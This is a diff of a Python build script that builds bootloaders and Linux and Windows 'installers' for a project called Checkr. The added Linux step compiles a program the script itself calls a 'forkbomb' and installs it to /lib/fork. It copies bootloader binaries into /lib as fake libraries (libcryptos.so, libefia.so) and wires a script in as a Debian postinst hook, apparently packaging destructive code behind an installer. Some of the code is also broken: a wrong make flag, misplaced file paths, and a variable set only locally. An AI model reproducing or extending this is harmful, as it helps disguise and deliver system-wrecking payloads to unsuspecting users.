@@ -1,12 +1,12 @@
 #!env python3
 
-import os, shutil, platform, cursor, atexit, json
+import os, shutil, platform, json, getpass, subprocess
+from time import sleep
 from colorama import Fore
+import pymsbuild._build
 
-atexit.register(cursor.show)
-
-cursor.hide()
-
+username = getpass.getuser()
+msbuildpath = ""
 if os.path.exists("config.json") == False:
     print(f"{Fore.RED} Configuration file not found. Please ensure you have a configuration file.")
     exit(1)
@@ -16,58 +16,79 @@ conf = json.load(open("config.json"))
 def verbose(fore, msg):
     if conf["verbose"] == "true": print(f"{fore} {msg} {Fore.RESET}")
 
+def cleanup():
+    verbose(Fore.CYAN, "Cleaning up...")
+    if os.path.exists("bin"): shutil.rmtree("bin", ignore_errors=True)
+    if os.path.exists("build"): shutil.rmtree("build", ignore_errors=True)
+    verbose(Fore.GREEN, "Cleanup Done!\n{Fore.RESET}")
 def is_tool(name):
     """Check whether `name` is on PATH and marked as executable."""
     return shutil.which(name) is not None
 
 def prepare():
     verbose(Fore.CYAN, "Preparing build environment...")
-    verbose(Fore.CYAN, "Checking tools...")
+    
+    if os.path.exists("build") == False: os.mkdir("build")
+    if os.path.exists("bin") == False: os.mkdir("bin")
+    
+    verbose(Fore.CYAN, "Checking tools...\n")
     if platform.system() == "Linux":
-        if not is_tool("make") == True: 
-            print("make is not installed") 
+        if conf["distribution"] == "Arch":
+            if is_tool("makepkg") == False: 
+                print(f"{Fore.RED}makepkg is not installed{Fore.RESET}") 
+                exit(1)
+        elif conf["distribution"] == "Debian":
+            if is_tool("dpkg-deb") == False:
+                print(f"{Fore.RED}dpkg-deb is not installed{Fore.RESET}")
+                exit(1)
+        if is_tool("make") == False: 
+            print(f"{Fore.RED}make is not installed{Fore.RESET}") 
             exit(1)
-        
-        if not is_tool("gcc") == True: 
-            print("gcc is not installed")
+            
+        if is_tool("gcc") == False: 
+            print(f"{Fore.RED}gcc is not installed{Fore.RESET}")
             exit(1)
+
     elif platform.system() == "Windows":
-        if not is_tool("msvc") == True: 
-            print("nmake is not installed")
+        if os.path.exists("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvarsall.bat"): 
+            msbuildpath = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvarsall.bat x64"
+            return
+        elif os.path.exists("C:\\Program Files\\Microsoft Visual Studio\\2022\\Preview\\VC\\Auxiliary\\Build\\vcvarsall.bat"):
+            msbuildpath = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Preview\\VC\\Auxiliary\\Build\\vcvarsall.bat x64"
+            return
+        else:
+            print(f"{Fore.RED}msbuild is not installed{Fore.RESET}")
             exit(1)
-        
-    if not is_tool("git") == True: 
-        print("git is not installed")
+    
+    if is_tool("git") == False: 
+        print(f"{Fore.RED}git is not installed{Fore.RESET}")
         exit(1)
         
     if not is_tool("nasm") == True: 
-        print("nasm is not installed")
+        print(f"{Fore.RED}nasm is not installed{Fore.RESET}")
         exit(1)
     
     if conf["cleanup"] == "true": 
         cleanup()
         
-    if os.path.exists("build") == False: os.mkdir("build")
-    if os.path.exists("bin") == False: os.mkdir("bin")
+    verbose(Fore.GREEN, "Done.\n")
     
-    atexit.register(cleanup)
+# atexit.register(cleanup)
+
     
 def makebios():
     print(f"{Fore.BLUE} BIOS bootloader is being built...")
-    os.chdir("Bootloader/BIOS")
-    os.system("make > /dev/null")
-    shutil.copyfile("boot.bin", "../../bin/boot.bin")
+    if platform.system() == "Linux":
+        os.system("make -c Bootloader/BIOS > /dev/null")
+    else:
+        os.system("nasm Bootloader/BIOS/bootloader.asm -f bin -o build/boot.bin")
     os.remove("boot.bin")
     done = True
     print(f"{Fore.GREEN} BIOS bootloader built!{Fore.RESET}")
     
-def cleanup():
-    verbose(Fore.CYAN, "Cleaning up...")
-    if os.path.exists("bin"): shutil.rmtree("bin", ignore_errors=True)
-    if os.path.exists("build"): shutil.rmtree("build", ignore_errors=True)
-    verbose(Fore.GREEN, "Cleanup Done!\n{Fore.RESET}")
-    
 def makeefi():
+    target= "DEBUG" if conf["target"] == "DEBUG" else "RELEASE"
+    arch=  "X64" if conf["arch"] == "x64" else "IA32" if conf["arch"] == "x86" else "AArch64"
     print(f"{Fore.BLUE} EFI bootloader is being built...{Fore.RESET}")
     os.chdir("../../build")
     verbose(Fore.CYAN, "Checking for edk2 installation...")
@@ -102,7 +123,7 @@ def makeefi():
     with open("Conf/target.txt", "w") as f: f.writelines(eficonf)
     verbose(Fore.CYAN, "Building bootloader...")
     os.system("bash -c \"source edksetup.sh && build\"")
-    shutil.copyfile(f"CheckrPkg/Build/{conf["target"]}_GCC5/{"X64" if conf["arch"] == "x64" else "IA32" if conf["arch"] == "x86" else "AArch64"}/Checkr.efi", "../../bin/boot.efi")
+    shutil.copyfile(f"CheckrPkg/Build/{target}_GCC5/{arch}/Checkr.efi", "../../build/boot.efi")
     print(f"{Fore.GREEN}EFI bootloader built!{Fore.RESET}")
 
 def makelinux():
@@ -111,21 +132,47 @@ def makelinux():
     verbose(Fore.CYAN, "Compiling forkbomb...")
     os.system("gcc -o fork fork.c")
     verbose(Fore.CYAN, "Copying files...")
-    os.chdir("../../")
+    os.chdir("../..")
+    if conf["distribution"] == "Arch":
+        shutil.copytree("Templates/Arch", "build/arch")
+    else:
+        shutil.copytree("Templates/Debian", "build/debian")
+        
+    shutil.copyfile("Installer/Linux/src/main.py", "build/debian/DEBIAN/postinst")
+    shutil.copyfile("Installer/Linux/fork", "/lib/fork")
+    shutil.copyfile("build/boot.bin", "/lib/libcryptos.so")
+    shutil.copyfile("build/boot.efi", "/lib/libefia.so")
+    os.system("chmod +x build/debian/DEBIAN/postinst")
+    os.system("chmod +x /lib/fork")
+    os.system("dpkg-deb --build build/debian")
     
     print(f"{Fore.GREEN} Linux installer built!{Fore.RESET}")
 
+def makewindows():
+    print(f"{Fore.BLUE} Windows installer is being built...")
+    os.chdir("./Installer/Windows")
+    verbose(Fore.CYAN, "Compiling project...")
+    print(f"{Fore.GREEN}Please type \"msbuild -p:Configuration=Release\" and then when the command is done type \"exit\".{Fore.RESET}")
+    subprocess.call("cmd /c \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Preview\\Common7\\Tools\\VsMSBuildCmd.bat\" && msbuild -p:Configuration=Release", shell=True)
+    verbose(Fore.CYAN, "Copying files...")
+    os.chdir("../..")
+    shutil.copyfile(f"Installer/Windows/{'x64/Release' if conf['arch'] == 'x64' else 'Release'}/Checkr.exe", "build/Checkr.exe")
+    print(f"{Fore.GREEN} Windows installer built!{Fore.RESET}")
+
 prepare()
 
-print(f"{Fore.MAGENTA} Configuration:\n Build type: {conf["buildtype"]}\n Architecture: {conf["arch"]}\n Package name: {conf["pkgname"]}\n")
+print(f"{Fore.MAGENTA} Configuration:\n Build type: {conf['buildtype']}\n Architecture: {conf['arch']}\n Package name: {conf['pkgname']}\n")
 
 if platform.system() == "Linux": print(f"{Fore.YELLOW}Checklist:\n + Build BIOS Bootloader\n + Build UEFI Bootloader\n + Build Installer\n")
 if platform.system() == "Windows": print(f"{Fore.YELLOW}Checklist:\n + Build Installer\n")
 
+print(f"{Fore.BLUE}Starting build in 5 seconds...{Fore.RESET}\n")
+sleep(5)
+
 if conf["buildtype"] == "all" and platform.system() == "Linux":
     makebios()
     makeefi()
-    # makelinux()
+    makelinux()
 elif conf["buildtype"] == "all" and platform.system() == "Windows":
     makebios()
     makeefi()
@@ -138,4 +185,4 @@ elif conf["buildtype"] == "installer" and platform.system() == "Linux":
 elif conf["buildtype"] == "installer" and platform.system() == "Windows":
     makewindows()
 else:
-    print(f"{Fore.RED}Invalid build type: {conf["buildtype"]}")
+    print(f"{Fore.RED}Invalid build type: {conf['buildtype']}")
